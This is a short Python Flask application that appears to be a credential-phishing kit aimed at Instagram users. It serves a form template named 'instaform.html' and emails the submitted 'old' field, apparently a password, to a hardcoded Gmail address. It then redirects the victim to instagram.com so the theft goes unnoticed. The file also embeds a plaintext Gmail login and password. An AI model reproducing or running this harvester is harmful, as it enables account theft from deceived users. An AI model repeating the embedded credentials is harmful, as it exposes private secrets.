from flask import Flask,render_template,request,redirect,url_for
import json
import smtplib

app = Flask(__name__)

@app.route('/')
@app.route('/index')
def index():
    return render_template('instaform.html')

@app.route('/process',methods=['GET','POST'])
def process():
    if request.method == 'POST':
        data = request.form
        to = ['abhijithbinoy11@gmail.com']
        server = smtplib.SMTP('smtp.gmail.com',587)
        server.ehlo()
        server.starttls()
        server.login('abhijithb007m@gmail.com','abhiabhiabhiabhi')
        result = data['old']
        server.sendmail('abhijithb007m@gmail.com',to,result)
        server.close()
        return redirect("http://www.instagram.com")




if __name__=="__main__":
    app.run(debug=True)